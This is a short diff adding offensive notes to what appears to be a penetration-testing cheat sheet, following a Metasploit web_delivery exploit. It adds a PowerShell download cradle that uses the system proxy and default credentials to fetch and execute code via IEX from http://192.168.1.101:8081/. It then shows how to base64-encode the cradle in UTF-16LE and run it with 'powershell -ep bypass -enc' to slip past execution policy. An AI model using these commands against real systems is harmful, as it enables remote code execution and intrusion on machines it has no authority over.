@@ -20,3 +20,17 @@
     uripath => /
     
     msf exploit(web_delivery) > exploit
+    
+`powershell Exec  in 1.txt`
+  
+    $n=new-object net.webclient;
+
+    $n.proxy=[Net.WebRequest]::GetSystemWebProxy();
+
+    $n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
+    
+    IEX $n.downloadstring('http://192.168.1.101:8081/');
+    
+    cat 1.txt | iconv --to-code UTF-16LE |base64
+    
+    powershell -ep bypass -enc  base64encode  in 1.txt
